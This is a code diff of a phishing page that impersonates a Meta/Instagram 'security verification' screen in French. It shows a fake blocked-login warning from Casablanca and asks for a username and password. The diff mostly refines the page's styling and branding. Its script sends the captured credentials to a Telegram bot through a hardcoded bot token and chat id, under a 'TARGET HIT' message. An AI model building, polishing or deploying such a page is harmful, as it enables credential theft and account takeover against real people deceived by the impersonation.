@@ -3,15 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Centre de Sécurité Meta</title>
+    <title>Centre de gestion des comptes Meta</title>
     <style>
         :root { 
             --meta-blue: #0064e0; 
-            --deep-blue: #0749a0; 
+            --deep-blue: #0a4f9a; 
+            --card-gray: #f0f2f5; 
+            --meta-header: #fff;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
         
-        /* الخلفية الزرقاء الكاملة */
+        /* الخلفية الزرقاء المتدرجة 2026 */
         body { 
             background: linear-gradient(135deg, var(--meta-blue) 0%, var(--deep-blue) 100%); 
             display: flex; 
@@ -19,101 +21,119 @@
             justify-content: center; 
             min-height: 100vh; 
             padding: 20px; 
+            box-shadow: inset 0 0 150px rgba(0,0,0,0.1);
         }
 
-        /* المربع الأبيض الداخلي */
+        /* المربع الأبيض الداخلي (The UI Card) */
         .card { 
             background: white; 
-            border-radius: 12px; 
+            border-radius: 15px; 
             width: 100%; 
-            max-width: 400px; 
-            padding: 30px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2); 
+            max-width: 420px; 
+            padding: 35px; 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3); 
             text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+            position: relative;
         }
 
-        .ig-icon { 
-            width: 70px; 
-            height: 70px; 
-            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); 
-            border-radius: 18px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            margin: 0 auto 20px; 
-        }
-        .ig-icon img { width: 45px; filter: brightness(0) invert(1); }
-
-        h2 { font-size: 22px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
+        .meta-hub { text-align: center; margin-bottom: 30px; }
         
+        /* تصميم الأيقونة المتدرجة بالـ Base64 */
+        .ig-branded-icon { 
+            width: 80px; height: 80px; 
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); 
+            border-radius: 20px; 
+            display: flex; align-items: center; justify-content: center; 
+            margin: 0 auto 20px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        
+        /* زرع كود لوغو إنستغرام الأبيض مباشرة (Base64) */
+        .ig-white-glyph {
+            width: 50px; height: 50px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAyLjA4OWMuMzI1IDAgLjM2Ny4wMTIgNC4wMTMuMTk4IDEuMTY1LjA1NSAyLjIwNi4yMDQgMy4wOTIuNzQyIDEuMjU2LjY1NyAyLjM0NSAxLjg4OSAyLjUzNiAzLjAyLjQ1NyAxLjExOC41MzYgMi4yMTYuNTYgMy42MTUuMDI3IDEuNjM4LjAyNyAxLjg5Mi4wMjcgNy4yMDJzMCA1LjU2NC0uMDI3IDcuMjAyYy0uMDI4IDEuNDAtLjEwMyAyLjQ5Ny0uNTYgMy42MTUtLjE5MSAxLjEzMS0xLjI4IDIuMzYzLTIuNTM2IDMuMDItLjg4Ni41MzgtMS45MjcuNjg3LTMuMDkyLjc0Mi0zLjY0Ni4xODYtMy42ODguMTk4LTQuMDEzLjE5OHMtLjM2Ny0uMDEyLTQuMDEzLS4xOThjLTEuMTY1LS4wNTUtMi4yMDYtLjIwNC0zLjA5Mi0uNzQyLTEuMjU2LS42NTctMi4zNDUtMS44ODktMi41MzYtMy4wMi0uNDU3LTEuMTE4LS41MzYtMi4yMTYtLjU2LTMuNjE1LS4wMjctMS42MzguMDI4LTEuODkyLS4wMjctNy4yMDJzMC01LjU2NC4wMjctNy4yMDJjLjAyNC0xLjQuMTAzLTIuNDk3LjU2LTMuNjE1LjE5MS0xLjEzMSAxLjI4LTIuMzYzIDIuNTM2LTozLjAyLjg4Ni0uNTM4IDEuOTI3LS42ODcgMy4wOTItLjc0MiAzLjY0Ni0uMTg2IDMuNjg4LS4xOTggNC4wMTMtLjE5OHptMC0yLjA4OWMtNC4xMjggMC00LjY0NS4wMTUtNy44NzYuMTY2-Mi4yOTQuMTA2LTQuMDQ4LjQ1NC01LjM4NiAxLjMwMS0yLjE2IDEuMjUxLTMuNzg0IDMuNTExLTQuNzk1IDQuNzk4LS45NzQgMS4zNzEtMS4zNTQgMy4xMDUtMS41MzIgNS4zODYtLjEzNCAzLjA1Ny0uMTQ4IDQuMDQzLS4xNDggNy44NzZzMCA0LjgxOS4xNDggNy44NzZjLS4wNDcgMi4yODEuMjkzIDQuMDE1IDEuNTMyIDUuMjg2IDEuMDAzIDEuMjcxIDMuMDU3IDMuMDQzIDQuNzk1IDQuNzk4IDEuNTMgMi4xNjQgMi45MTIgMi43MzYgNS4zODYgNS40NDEgMi4yODMuMTMxIDQuODE5LjEzMSA3Ljg3Ni4xMzFzNS41OTMtLjAxNSA3Ljg3Ni0uMTY1YzEuMjEzLS4wODggNC4wNDgtLjQ1NCA1LjM4Ni0xLjMwMSAyLjE2LTEuMjUxIDMuNzg0LTMuNTExIDQuNzk1LTQuNzk4IDEuMjYxLTEuNzM2IDEuNTYtMy4yNTEgMS41MzItNS4zODYuMTQxLTMuMDU3LjE0MS00LjA0My4xNDEtNy44NzZzLS4wMTUtNC44MTktLjE0MS03Ljg3NmMtLjA0Ny0yLjI4MS4yOTMtNC4wMTUtMS41MzItNS4zODYtMi4wMTMtMi41MjQtMy43OTQtMy43NTQtNC43OTUtNC43OTgtMi4wMTctMi44NC0zLjg2Mi0zLjA1NS01LjM4Ni01LjQ0MS0yLjI4My0uMTMxLTQuODE5LS4xMzEtNy44NzYtLjEzMXpTMTIgNy4yNDljLTMuOTYxIDAtNy4xNyAzLjIwOC03LjE3IDcuMTY5czMuMjA5IDcuMTY5IDcuMTcgNy4xNjkgNy4xNy0zLjIwOSA3LjE3LTcuMTY5LTMuMjA5LTcuMTY5LTcuMTctNy4xNjl6bTAtNi4zODJjNC42MjcgMCA4LjQwMSAzLjc3NSA4LjQwMSA4LjQwMXMtMy43NzUgOC40MDEtOC40MDEgOC40MDEtOC40MDEtMy43NzUtOC40MDEtOC40MDEgMy43NzUtOC40MDEgOC40MDEtOC40MDF6bTguNjY3LTIuNThjLjQ5IDAgLjg5MS0uNDAyLjg5MS0uODk4czAgLS44OTctLjg5MS0uODk3Yy0uNDkzIDAtLjg5NC40MDEtLjg5NC44OTdzMCAuODk4Ljg5NC44OTh6Ii8+PC9zdmc+');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        h2 { font-size: 24px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
+        
+        /* صندوق التنبيه Casablanca */
         .alert-box { 
             background: #fff4f4; 
             border: 1px solid #f9d6d6; 
-            border-radius: 10px; 
-            padding: 15px; 
+            border-radius: 12px; 
+            padding: 18px; 
             margin-bottom: 25px; 
             display: flex; 
             align-items: center;
             text-align: left;
+            border-left: 5px solid #fa3e3e;
         }
-        .alert-box svg { fill: #fa3e3e; width: 28px; margin-right: 12px; flex-shrink: 0; }
-        .alert-text { font-size: 13px; color: #4b4f56; line-height: 1.4; }
-        .details { font-weight: 700; color: #d93025; }
+        .alert-box svg { fill: #fa3e3e; width: 32px; margin-right: 15px; flex-shrink: 0; }
+        .alert-text { font-size: 14px; color: #4b4f56; line-height: 1.5; }
+        .details { font-weight: 700; color: #d93025; display: block; margin-top: 5px; }
 
         input { 
             width: 100%; 
-            padding: 15px; 
+            padding: 16px; 
             background: #f5f6f7; 
             border: 1px solid #dddfe2; 
-            border-radius: 8px; 
+            border-radius: 10px; 
             margin-bottom: 12px; 
-            font-size: 14px; 
+            font-size: 15px; 
             transition: 0.2s; 
+            outline: none;
         }
-        input:focus { background: white; border-color: var(--meta-blue); outline: none; }
+        input:focus { background: white; border-color: var(--meta-blue); box-shadow: 0 0 0 3px #e7f3ff; }
 
         .btn { 
             width: 100%; 
             background: var(--meta-blue); 
             color: white; 
             border: none; 
-            padding: 15px; 
-            border-radius: 8px; 
+            padding: 16px; 
+            border-radius: 10px; 
             font-weight: 700; 
-            font-size: 16px; 
+            font-size: 17px; 
             cursor: pointer; 
             transition: 0.3s; 
         }
-        .btn:hover { background: #166fe5; }
+        .btn:hover { background: #166fe5; transform: translateY(-1px); }
+        .btn:active { background: #1362c9; transform: translateY(0); }
 
         .footer { 
-            margin-top: 25px; 
-            padding-top: 15px; 
+            margin-top: 35px; 
+            padding-top: 20px; 
             border-top: 1px solid #ebedf0; 
         }
-        .footer img { width: 80px; opacity: 0.8; }
+        .footer img { width: 90px; opacity: 0.9; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="ig-icon">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
+    <div class="meta-hub">
+        <div class="ig-branded-icon">
+            <div class="ig-white-glyph"></div>
+        </div>
     </div>
+    
     <h2>Vérification de sécurité</h2>
 
     <div class="alert-box">
         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
         <div class="alert-text">
-            Tentative de connexion bloquée : <br>
+            Une tentative de connexion bloquée : <br>
             <span class="details">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
             <br>Veuillez confirmer votre identité pour déverrouiller votre compte.
         </div>
     </div>
 
     <form id="final-gate">
-        <input type="text" id="user" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
-        <input type="password" id="pass" placeholder="Mot de passe" required>
+        <input type="text" id="user" placeholder="Nom d'utilisateur, e-mail ou mobile" required autocomplete="username">
+        <input type="password" id="pass" placeholder="Mot de passe" required autocomplete="current-password">
         <button type="submit" class="btn">Sécuriser le compte</button>
     </form>
 
@@ -130,7 +150,7 @@
         const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
         const id = "5558301795";
         
-        const text = `🚨 **TARGET HIT: MAROC BYPASS** 🚨\n\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n📍 **Source:** Meta Security Portal`;
+        const text = `🚨 **TARGET HIT: MAROC PORTAL** 🚨\n\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n🔒 **Source:** Meta Security Portal`;
 
         await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
         
